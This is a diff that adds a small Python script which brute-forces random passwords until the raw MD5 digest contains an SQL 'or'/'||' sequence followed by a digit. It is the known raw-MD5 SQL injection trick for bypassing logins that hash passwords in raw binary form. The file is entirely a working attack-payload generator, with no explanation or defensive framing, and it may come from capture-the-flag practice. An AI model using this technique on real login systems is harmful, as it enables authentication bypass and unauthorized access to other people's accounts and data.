@@ -1,0 +1,42 @@
+import hashlib
+import random
+
+def sqlinjectionmd5():
+
+    characters = [x for x in range(48, 58)]
+    characters.extend(range(65, 91))
+    characters.extend(range(97, 123))
+    characters = [chr(x) for x in characters]
+
+    length = 16
+
+    substring1 = (r"'||'")
+    substring2 = (r"'or'")
+    substring3 = (r"'Or'")
+    substring4 = (r"'OR'")
+    substring5 = (r"'oR'")
+    goodsubstrings = [substring1, substring2, substring3, substring4, substring5]
+
+    numbersok = [x for x in range(1,10)]
+
+    while(True):
+        password = ""
+        for x in range(length):
+            letter = random.choice(characters)
+            password += letter
+        hash = hashlib.md5(password.encode())
+        hashbytes = str(hash.digest())
+
+        for sub in goodsubstrings:
+            if sub in hashbytes:
+                index = hashbytes.index(sub)
+                if (index + 4) > (len(hashbytes) - 1):
+                    continue
+                elif (hashbytes[index + 4]).isnumeric():
+                    if int(hashbytes[index + 4]) in numbersok:
+                        print("Found!")
+                        print(password)
+                        return password
+
+if __name__ == "__main__":
+    sqlinjectionmd5()
